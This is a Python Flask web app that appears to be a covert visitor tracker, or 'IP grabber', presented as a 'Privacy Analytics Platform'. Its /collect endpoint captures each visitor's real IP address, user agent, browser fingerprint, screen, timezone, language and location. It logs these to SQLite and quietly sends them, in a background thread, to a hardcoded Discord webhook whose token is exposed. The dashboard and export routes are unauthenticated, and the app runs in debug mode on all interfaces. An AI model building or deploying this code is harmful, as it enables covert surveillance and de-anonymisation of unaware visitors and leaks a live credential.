from flask import Flask, request, render_template, jsonify, redirect, url_for
import hashlib
import uuid
import platform
import socket
import datetime
import json
import os
import sqlite3
import requests
import threading
import io
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'your-secret-key-change-this'

# Discord webhook configuration
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1398769513968697505/nWEKb051aJAzOkIKFQPHLqM_KTKJZ7mtyCp-xyBQIH8gWPBTuCylDp0je14EJ2Mdo9kb'

# Database setup
def init_db():
    conn = sqlite3.connect('data_logs.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS visitor_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            ip_address TEXT,
            hashed_ip TEXT,
            user_agent TEXT,
            browser TEXT,
            os TEXT,
            platform TEXT,
            screen_resolution TEXT,
            timezone TEXT,
            language TEXT,
            referrer TEXT,
            session_id TEXT,
            fingerprint TEXT,
            country TEXT,
            city TEXT,
            additional_data TEXT,
            unique_identifier TEXT,
            discord_sent BOOLEAN DEFAULT 0
        )
    ''')
    conn.commit()
    conn.close()

def get_client_ip():
    """Get the real client IP address"""
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    else:
        return request.remote_addr

def hash_ip(ip_address):
    """Hash IP address for privacy"""
    return hashlib.sha256(ip_address.encode()).hexdigest()

def generate_hwid():
    """Generate a hardware ID based on available system info"""
    try:
        # Get system information
        system_info = {
            'platform': platform.platform(),
            'processor': platform.processor(),
            'machine': platform.machine(),
            'node': platform.node()
        }
        
        # Create a unique identifier
        hwid_string = json.dumps(system_info, sort_keys=True)
        hwid = hashlib.md5(hwid_string.encode()).hexdigest()
        return hwid
    except:
        return str(uuid.uuid4())

def send_to_discord(data, session_id):
    """Send collected data to Discord webhook"""
    try:
        # Prepare data for Discord
        embed_data = {
            "embeds": [{
                "title": "🔍 New Visitor Data Collected",
                "color": 3447003,  # Blue color
                "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
                "fields": [
                    {"name": "🆔 Unique ID", "value": f"`{data.get('unique_identifier', 'Unknown')}`", "inline": True},
                    {"name": "🔗 Session ID", "value": f"`{session_id[:16]}...`", "inline": True},
                    {"name": "🌐 IP Address", "value": f"`{data.get('ip_address', 'Unknown')}`", "inline": True},
                    {"name": "🔒 Hashed IP", "value": f"`{data.get('hashed_ip', 'Unknown')[:16]}...`", "inline": True},
                    {"name": "🖥️ Operating System", "value": data.get('os', 'Unknown'), "inline": True},
                    {"name": "🌍 Browser", "value": data.get('browser', 'Unknown'), "inline": True},
                    {"name": "📱 Platform", "value": data.get('platform', 'Unknown'), "inline": True},
                    {"name": "📏 Screen Resolution", "value": data.get('screen_resolution', 'Unknown'), "inline": True},
                    {"name": "🌍 Timezone", "value": data.get('timezone', 'Unknown'), "inline": True},
                    {"name": "🗣️ Language", "value": data.get('language', 'Unknown'), "inline": True},
                    {"name": "🔗 Referrer", "value": data.get('referrer', 'Direct')[:50] + "..." if len(data.get('referrer', '')) > 50 else data.get('referrer', 'Direct'), "inline": False},
                    {"name": "🔐 Fingerprint", "value": f"`{data.get('fingerprint', 'Unknown')[:32]}...`", "inline": False}
                ],
                "footer": {"text": "Privacy Analytics Platform"}
            }]
        }
        
        # Send to Discord webhook
        response = requests.post(DISCORD_WEBHOOK_URL, json=embed_data, timeout=10)
        
        # Also send detailed data as a file
        detailed_data = json.dumps(data, indent=2, default=str)
        files = {
            'file': (f'visitor_data_{session_id[:8]}.json', detailed_data, 'application/json')
        }
        
        file_message = {
            "content": f"📄 Detailed privacy analysis data for user `{data.get('unique_identifier', 'Unknown')}`"
        }
        
        requests.post(DISCORD_WEBHOOK_URL, data=file_message, files=files, timeout=10)
        
        return True
    except Exception as e:
        print(f"Error sending to Discord: {e}")
        return False

def send_to_discord_async(data, session_id):
    """Send data to Discord in a background thread"""
    thread = threading.Thread(target=send_to_discord, args=(data, session_id))
    thread.daemon = True
    thread.start()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/collect', methods=['POST'])
def collect_data():
    """Endpoint to collect visitor data"""
    try:
        # Get IP and hash it
        ip_address = get_client_ip()
        hashed_ip = hash_ip(ip_address)
        
        # Get data from request
        data = request.get_json() if request.is_json else {}
        
        # Extract user agent info
        user_agent = request.headers.get('User-Agent', '')
        
        # Generate session ID and unique identifier
        session_id = str(uuid.uuid4())
        unique_identifier = f"USER_{hashlib.sha256(f'{ip_address}{user_agent}{datetime.datetime.now().isoformat()}'.encode()).hexdigest()[:12]}"
        
        # Collect all data
        log_data = {
            'ip_address': ip_address,
            'hashed_ip': hashed_ip,
            'user_agent': user_agent,
            'browser': data.get('browser', ''),
            'os': data.get('os', ''),
            'platform': data.get('platform', ''),
            'screen_resolution': data.get('screen_resolution', ''),
            'timezone': data.get('timezone', ''),
            'language': data.get('language', ''),
            'referrer': request.headers.get('Referer', ''),
            'session_id': session_id,
            'fingerprint': data.get('fingerprint', ''),
            'country': data.get('country', ''),
            'city': data.get('city', ''),
            'additional_data': json.dumps(data),
            'unique_identifier': unique_identifier
        }
        
        # Save to database
        conn = sqlite3.connect('data_logs.db')
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO visitor_logs 
            (ip_address, hashed_ip, user_agent, browser, os, platform, 
             screen_resolution, timezone, language, referrer, session_id, 
             fingerprint, country, city, additional_data, unique_identifier, discord_sent)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            log_data['ip_address'], log_data['hashed_ip'], log_data['user_agent'],
            log_data['browser'], log_data['os'], log_data['platform'],
            log_data['screen_resolution'], log_data['timezone'], log_data['language'],
            log_data['referrer'], log_data['session_id'], log_data['fingerprint'],
            log_data['country'], log_data['city'], log_data['additional_data'],
            log_data['unique_identifier'], 1
        ))
        conn.commit()
        conn.close()
        
        # Send data to Discord webhook asynchronously
        send_to_discord_async(log_data, session_id)
        
        return jsonify({
            'status': 'success',
            'session_id': session_id,
            'hwid': generate_hwid()
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/dashboard')
def dashboard():
    """Dashboard to view collected data"""
    conn = sqlite3.connect('data_logs.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM visitor_logs ORDER BY timestamp DESC LIMIT 100')
    logs = cursor.fetchall()
    
    # Get column names
    cursor.execute('PRAGMA table_info(visitor_logs)')
    columns = [column[1] for column in cursor.fetchall()]
    
    conn.close()
    
    return render_template('dashboard.html', logs=logs, columns=columns)

@app.route('/api/stats')
def get_stats():
    """API endpoint for statistics"""
    conn = sqlite3.connect('data_logs.db')
    cursor = conn.cursor()
    
    # Total visitors
    cursor.execute('SELECT COUNT(*) FROM visitor_logs')
    total_visitors = cursor.fetchone()[0]
    
    # Unique IPs
    cursor.execute('SELECT COUNT(DISTINCT ip_address) FROM visitor_logs')
    unique_ips = cursor.fetchone()[0]
    
    # Most common browsers
    cursor.execute('SELECT browser, COUNT(*) as count FROM visitor_logs WHERE browser != "" GROUP BY browser ORDER BY count DESC LIMIT 5')
    browsers = cursor.fetchall()
    
    # Most common OS
    cursor.execute('SELECT os, COUNT(*) as count FROM visitor_logs WHERE os != "" GROUP BY os ORDER BY count DESC LIMIT 5')
    operating_systems = cursor.fetchall()
    
    # Visits per day (last 7 days)
    cursor.execute('''
        SELECT DATE(timestamp) as date, COUNT(*) as visits 
        FROM visitor_logs 
        WHERE DATE(timestamp) >= DATE('now', '-7 days')
        GROUP BY DATE(timestamp)
        ORDER BY date
    ''')
    daily_visits = cursor.fetchall()
    
    conn.close()
    
    return jsonify({
        'total_visitors': total_visitors,
        'unique_ips': unique_ips,
        'browsers': browsers,
        'operating_systems': operating_systems,
        'daily_visits': daily_visits
    })

@app.route('/export')
def export_data():
    """Export data as JSON"""
    conn = sqlite3.connect('data_logs.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM visitor_logs')
    logs = cursor.fetchall()
    
    cursor.execute('PRAGMA table_info(visitor_logs)')
    columns = [column[1] for column in cursor.fetchall()]
    
    conn.close()
    
    # Convert to list of dictionaries
    data = []
    for log in logs:
        data.append(dict(zip(columns, log)))
    
    return jsonify(data)

if __name__ == '__main__':
    init_db()
    app.run(debug=True, host='0.0.0.0', port=5000)